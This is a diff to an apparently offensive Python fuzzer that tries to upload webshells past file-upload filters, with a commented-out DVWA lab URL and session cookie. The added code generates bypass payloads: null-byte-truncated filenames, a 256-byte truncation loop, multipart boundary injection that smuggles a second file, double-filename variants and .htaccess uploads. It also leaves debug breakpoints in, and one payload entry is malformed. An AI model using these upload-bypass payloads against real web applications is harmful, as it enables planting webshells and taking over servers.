@@ -133,34 +133,40 @@ def fuzz_upload_webshell():
     # url = 'http://192.168.135.39/dvwa/vulnerabilities/upload/'
     # cookie = 'security=low; PHPSESSID=cl4u4quib5tebhico07nopn2o0'
     filename = "file.jpg.php"
+    filename = "filename=test.php\x00.jpg"
     content_type = 'image/jpeg'
     work_file_info = get_work_file_info(url, cookie, form_data_dict, boundary,
                                         form_file_param_name, filename, content_type)
     print(work_file_info)
     work_suffix = work_file_info['file_suffix']
-    file_content = work_file_info['file_content']
+    work_file_content = work_file_info['file_content']
+    work_content_type = work_file_info['content_type']
 
     rsp = post_multipart_form_data(
-        url, cookie, form_data_dict, boundary, form_file_param_name, file_content, filename, content_type)
+        url, cookie, form_data_dict, boundary, form_file_param_name, work_file_content, filename, content_type)
     check_upload_succeed(rsp, origin_html)
+    pdb.set_trace()
     fuzz_file_name = [
         {'desc': '修改后缀为webshell后缀',
             'modify': {'filename': 'test.%s' % script_suffix}},
         {'desc': '修改后缀为正常后缀接";test.php",eg:"test.jpg;test.php"',
-            'modify': 'filename=test.%s;test.%s\r\nContent-Type: image/jpeg' % (work_suffix, script_suffix)},
-        {'desc': '%00截断', 'modify': 'filename=test.%s\r\nContent-Type: image/jpeg' % suffix},
-        {'desc': '双文件上传', 'modify': 'filename=test.%s\r\nContent-Type: image/jpeg' % suffix},
-        {'desc': '两个filename参数',
-            'modify': 'filename=test.%s\r\nContent-Type: image/jpeg' % suffix},
+            'modify': {'filename': 'test.%s;test.%s' % (work_suffix, script_suffix)}},
+        {'desc': '双文件上传,前正常文件后webshell', 'modify': {'filename': 'test.%s"\r\nContent-Type: %s\r\n\r\n%s\r\n%s\r\nContent-Disposition: form-data; name="%s"; filename="' % (work_suffix, work_content_type, work_file_content, '--' + boundary , form_file_param_name)}},
+        #{'desc': '双文件上传,前异常后正常', 'modify': {'filename':'test.%s\r\nContent-Type: %s' % suffix}},
+        {'desc': '两个filename参数', 'modify': {'filename': 'test.%s' % suffix}},
         {'desc': '两个filename参数以空格分割',
-            'modify': 'filename=test.%s\r\nContent-Type: image/jpeg' % suffix},
+            'modify': {'filename': 'test.%s' % suffix}},
         {'desc': '两个filename参数以Tab分割',
-            'modify': 'filename=test.%s\r\nContent-Type: image/jpeg' % suffix},
+            'modify': {'filename': 'test.%s' % suffix}},
         {'desc': '两个filename参数以\\r\\n分割',
-            'modify': 'filename=test.%s\r\nContent-Type: image/jpeg' % suffix},
+            'modify': {'filename': 'test.%s' % suffix}},
         {'desc': '上传.htaccess,只适用于php',
-            'modify': 'filename=test.%s\r\nContent-Type: image/jpeg' % suffix},
+            'modify': {'filename=test.%s' % suffix}},
     ]
+    for i in range(0, 256):
+        item = {'desc': '%00截断组,%s截断' % hex(i), 'modify': {
+                                            'filename': 'test.%s%s.%s' % (script_suffix, chr(i), work_suffix)}}
+        fuzz_file_name.append(item)
     fuzz_content_type = [
         {'desc': '修改content-type为image/jpeg',
             'modify': 'filename=test.%s\r\nContent-Type: image/jpeg' % suffix},
@@ -204,6 +210,7 @@ png_file_content = '''00000000: 8950 4e47 0d0a 1a0a 0000 000d 4948 4452  .PNG...
 info = get_form_data_post_info(url, cookie)
 form_data_dict = info['form_data_dict']
 form_file_param_name = info['form_file_param_name']
+pdb.set_trace()
 origin_html = info['origin_html']
 boundary = '-------------------------7df3069603d6'
 
